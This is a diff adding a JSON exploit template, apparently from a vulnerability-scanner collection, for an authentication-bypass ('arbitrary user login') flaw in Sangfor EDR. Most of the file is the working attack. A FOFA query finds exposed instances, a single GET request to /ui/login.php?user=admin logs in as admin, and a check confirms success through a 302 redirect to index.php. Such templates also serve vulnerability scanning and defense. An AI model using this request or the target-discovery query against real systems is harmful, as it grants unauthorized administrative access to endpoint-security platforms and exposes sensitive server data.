@@ -1,0 +1,35 @@
+{
+  "product": "深信服EDR",
+  "vul_name": "深信服EDR 任意用户登录",
+  "type": "访问控制",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "深信服终端检测响应平台EDR,通过云网端联动协同、威胁情报共享、多层级响应机制,帮助用户快速处置终端安全问题,构建轻量级、智能化、响应快的下一代终端安全系统。该EDR系统存在任意用户登录漏洞，攻击者通过漏洞可以登录系统后台并获取服务器的敏感信息。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "title=\"终端检测响应平台\" or app=\"SANGFOR-EDR\""
+  },
+  "protocol": "http",
+  "link": "https://cn-sec.com/archives/1802765.html",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/ui/login.php?user=admin"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 302,
+          "header": {
+            "Location": "index.php"
+          }
+        }
+      ]
+    }
+  }
+}
